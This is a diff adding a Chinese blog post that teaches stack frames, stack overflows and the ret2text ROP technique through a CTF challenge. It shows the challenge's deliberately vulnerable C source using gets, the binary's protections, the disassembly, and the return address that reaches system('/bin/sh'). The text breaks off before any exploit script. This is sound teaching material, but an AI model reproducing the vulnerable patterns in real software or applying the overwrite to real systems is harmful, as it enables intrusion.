@@ -1,0 +1,1510 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">Basic ROP - 高诺琪&#39;s Blog</title><meta name="Description" content="宁静致远"><meta property="og:title" content="Basic ROP" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://KohN0q1.github.io/basicrop/" /><meta property="og:image" content="https://KohN0q1.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-10-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-10-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://KohN0q1.github.io/logo.png"/>
+
+<meta name="twitter:title" content="Basic ROP"/>
+<meta name="twitter:description" content=""/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://KohN0q1.github.io/basicrop/" /><link rel="prev" href="https://KohN0q1.github.io/pwnenvironment/" /><link rel="next" href="https://KohN0q1.github.io/fmtstr/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Basic ROP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/KohN0q1.github.io\/basicrop\/"
+        },"genre": "posts","wordcount":  6970 ,
+        "url": "https:\/\/KohN0q1.github.io\/basicrop\/","datePublished": "2020-10-27T00:00:00+00:00","dateModified": "2020-10-27T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "高诺琪"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="auto" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friend/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="高诺琪&#39;s Blog">高诺琪&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friend/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#调用栈">调用栈</a></li>
+    <li><a href="#恢复栈">恢复栈</a></li>
+    <li><a href="#函数调用过程">函数调用过程</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#栈溢出原理">栈溢出原理</a></li>
+    <li><a href="#危险函数">危险函数</a></li>
+    <li><a href="#填充长度">填充长度</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ret2text">ret2text</a></li>
+    <li><a href="#ret2shellcode">ret2shellcode</a></li>
+    <li><a href="#ret2syscall">ret2syscall</a></li>
+    <li><a href="#ret2libc">ret2libc</a>
+      <ul>
+        <li><a href="#ret2libc1">ret2libc1</a></li>
+        <li><a href="#ret2libc2">ret2libc2</a></li>
+        <li><a href="#ret2libc3">ret2libc3</a></li>
+      </ul>
+    </li>
+    <li><a href="#plt表和got表">PLT表和GOT表</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Basic ROP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">高诺琪</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/pwn/"><i class="far fa-folder fa-fw"></i>pwn</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-10-27">2020-10-27</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-10-27">2020-10-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 6970 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 14 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#调用栈">调用栈</a></li>
+    <li><a href="#恢复栈">恢复栈</a></li>
+    <li><a href="#函数调用过程">函数调用过程</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#栈溢出原理">栈溢出原理</a></li>
+    <li><a href="#危险函数">危险函数</a></li>
+    <li><a href="#填充长度">填充长度</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ret2text">ret2text</a></li>
+    <li><a href="#ret2shellcode">ret2shellcode</a></li>
+    <li><a href="#ret2syscall">ret2syscall</a></li>
+    <li><a href="#ret2libc">ret2libc</a>
+      <ul>
+        <li><a href="#ret2libc1">ret2libc1</a></li>
+        <li><a href="#ret2libc2">ret2libc2</a></li>
+        <li><a href="#ret2libc3">ret2libc3</a></li>
+      </ul>
+    </li>
+    <li><a href="#plt表和got表">PLT表和GOT表</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"></br>
+<h1 id="栈帧" class="headerLink">
+    <a href="#%e6%a0%88%e5%b8%a7" class="header-mark"></a>栈帧</h1><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。</p>
+<p>函数状态主要涉及三个寄存器－－esp，ebp，eip。esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p>
+<h2 id="调用栈" class="headerLink">
+    <a href="#%e8%b0%83%e7%94%a8%e6%a0%88" class="header-mark"></a>调用栈</h2><p>下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态。</p>
+<ul>
+<li>
+<p>首先将被调用函数（callee）的参数按照逆序（cdecl）依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。</p>
+</li>
+<li>
+<p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。</p>
+</li>
+<li>
+<p>再将当前的ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp被更新为被调用函数（callee）的基地址。</p>
+</li>
+<li>
+<p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/%e6%a0%88%e5%88%86%e6%ad%a5%e5%9b%be.png"
+        data-srcset="/BasicROP.assets/%E6%A0%88%E5%88%86%E6%AD%A5%E5%9B%BE.png, /BasicROP.assets/%e6%a0%88%e5%88%86%e6%ad%a5%e5%9b%be.png 1.5x, /BasicROP.assets/%E6%A0%88%E5%88%86%E6%AD%A5%E5%9B%BE.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/%E6%A0%88%E5%88%86%E6%AD%A5%E5%9B%BE.png"
+        title="/BasicROP.assets/%E6%A0%88%E5%88%86%E6%AD%A5%E5%9B%BE.png"></p>
+<h2 id="恢复栈" class="headerLink">
+    <a href="#%e6%81%a2%e5%a4%8d%e6%a0%88" class="header-mark"></a>恢复栈</h2><p>下面就是要恢复上一个函数的状态了，变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。</p>
+<ul>
+<li>
+<p>首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。</p>
+</li>
+<li>
+<p>然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。</p>
+</li>
+<li>
+<p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。</p>
+</li>
+</ul>
+<p>至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。</p>
+<p><strong>以上内容转载于长亭的<a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener noreffer">手把手教你栈溢出从入门到放弃</a></strong>
+<br/></p>
+<h2 id="函数调用过程" class="headerLink">
+    <a href="#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e8%bf%87%e7%a8%8b" class="header-mark"></a>函数调用过程</h2><p>由上面的步骤解析，可以得到一个比较经典的函数调用过程为：</p>
+<ol>
+<li>开辟栈帧（push ebp(当前栈基址压栈)、mov ebp,esp(bp寄存器保存栈顶sp寄存器值)、sub esp,xx(开辟xx大小的栈空间）</li>
+<li>保存现场（寄存器的值压入栈中以保存数据）</li>
+<li>被调用函数的参数压栈（根据函数调用约定来决定压栈的参数顺序）</li>
+<li>调用者函数call被调用者函数（call指令会将下一个指令地址当作返回地址压栈，然后jmp到被调用者函数的地址）</li>
+<li>被调用函数保存调用者的栈底地址，然后再保存被调用者栈顶地址</li>
+<li>在被调用函数栈帧中，从ebp的位置开始存放局部变量和临时变量</li>
+<li>执行对应被调用函数功能</li>
+<li>执行完被调用函数后，将局部变量弹出栈外，然后恢复ESP，再将EBP弹出（leave等价于mov esp,ebp ; pop ebp）</li>
+<li>最后执行ret（等价于pop eip），恢复上个函数的状态</li>
+</ol>
+<p>函数调用栈如图：</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/%e6%a0%88%e5%b8%a7.png"
+        data-srcset="/BasicROP.assets/%E6%A0%88%E5%B8%A7.png, /BasicROP.assets/%e6%a0%88%e5%b8%a7.png 1.5x, /BasicROP.assets/%E6%A0%88%E5%B8%A7.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/%E6%A0%88%E5%B8%A7.png"
+        title="/BasicROP.assets/%E6%A0%88%E5%B8%A7.png"></p>
+<p>需要注意的是，32 位和 64 位程序传参不一样：</p>
+<p><strong>x86</strong></p>
+<ul>
+<li>函数参数在函数返回地址的上方</li>
+</ul>
+<p><strong>x64</strong></p>
+<ul>
+<li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用)中前六个整型或指针参数依次保存在RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。</li>
+<li>内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。</li>
+</ul>
+<br/>
+<h1 id="栈溢出" class="headerLink">
+    <a href="#%e6%a0%88%e6%ba%a2%e5%87%ba" class="header-mark"></a>栈溢出</h1><h2 id="栈溢出原理" class="headerLink">
+    <a href="#%e6%a0%88%e6%ba%a2%e5%87%ba%e5%8e%9f%e7%90%86" class="header-mark"></a>栈溢出原理</h2><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
+<ul>
+<li>程序必须向栈上写入数据</li>
+<li>写入的数据大小没有被良好地控制</li>
+</ul>
+<h2 id="危险函数" class="headerLink">
+    <a href="#%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0" class="header-mark"></a>危险函数</h2><ul>
+<li>
+<p>输入</p>
+</li>
+<li>
+<p>gets，直接读取一行，忽略&rsquo;\x00'</p>
+</li>
+<li>
+<p>scanf</p>
+</li>
+<li>
+<p>vscanf</p>
+</li>
+<li>
+<p>输出</p>
+</li>
+<li>
+<p>sprintf</p>
+</li>
+<li>
+<p>字符串</p>
+</li>
+<li>
+<p>strcpy，字符串复制，遇到&rsquo;\x00&rsquo;停止</p>
+</li>
+<li>
+<p>strcat，字符串拼接，遇到&rsquo;\x00&rsquo;停止</p>
+</li>
+<li>
+<p>bcopy</p>
+</li>
+<li>
+<p>read</p>
+</li>
+</ul>
+<h2 id="填充长度" class="headerLink">
+    <a href="#%e5%a1%ab%e5%85%85%e9%95%bf%e5%ba%a6" class="header-mark"></a>填充长度</h2><p>计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
+<ul>
+<li>相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得</li>
+<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
+<li>直接地址索引，就相当于直接给定了地址。</li>
+</ul>
+<p>一般来说，我们会有如下的覆盖需求</p>
+<ul>
+<li>覆盖函数返回地址，这时候就是直接看 EBP 即可。</li>
+<li>覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。</li>
+<li>覆盖 bss 段某个变量的内容。</li>
+<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
+</ul>
+<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p>
+<p><strong>以上来源于<a href="https://wiki.x10sec.org/pwn/stackoverflow/stackoverflow_basic/" target="_blank" rel="noopener noreffer">WIKI</a></strong></p>
+<br/>
+<h1 id="基本rop" class="headerLink">
+    <a href="#%e5%9f%ba%e6%9c%acrop" class="header-mark"></a>基本ROP</h1><h2 id="ret2text" class="headerLink">
+    <a href="#ret2text" class="header-mark"></a>ret2text</h2><p>ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。</p>
+<p>以下面为例，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2text/bamboofox-ret2text" target="_blank" rel="noopener noreffer">题目地址</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">secure</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">secretcode</span><span class="p">,</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">secretcode</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">input</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="n">secretcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;There is something amazing here, do you know anything?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Maybe I will tell you next time !&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看保护机制，开启了NX，其他均关闭</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gnq@virtual-machine:~/pwn$ checksec ret2text
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/gnq/pwn/ret2text&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用IDA打开，在main函数F5反编译，可以看到存在gets函数，存在栈溢出漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-64h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setvbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;There is something amazing here, do you know anything?&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Maybe I will tell you next time !&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在程序中的secure函数中存在system(&quot;/bin/sh&quot;)的代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804862</span><span class="n">D</span>                 <span class="n">call</span>    <span class="n">___isoc99_scanf</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048632</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">input</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048635</span>                 <span class="n">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">secretcode</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048638</span>                 <span class="n">jnz</span>     <span class="kt">short</span> <span class="n">locret_8048646</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804863</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">command</span> <span class="p">;</span> <span class="s">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048641</span>                 <span class="n">call</span>    <span class="n">_system</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>因为gets函数是以回车为结束符，只要不回车就可以不断输入字符，导致栈溢出，从而覆盖掉返回地址，从而控制程序流程，把返回地址设置成0x0804863A，那么系统就会执行system(&quot;/bin/sh&quot;)，从而getshell</p>
+<p><img
+        class="lazyload"
+        data-src="/BasicROP.assets/ret2text.png"
+        data-srcset="/BasicROP.assets/ret2text.png, /BasicROP.assets/ret2text.png 1.5x, /BasicROP.assets/ret2text.png 2x"
+        data-sizes="auto"
+        alt="/BasicROP.assets/ret2text.png"
+        title="/BasicROP.assets/ret2text.png"></p>
+<p>下面就是确定填充长度了，用gdb调试程序，生成200个字符，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
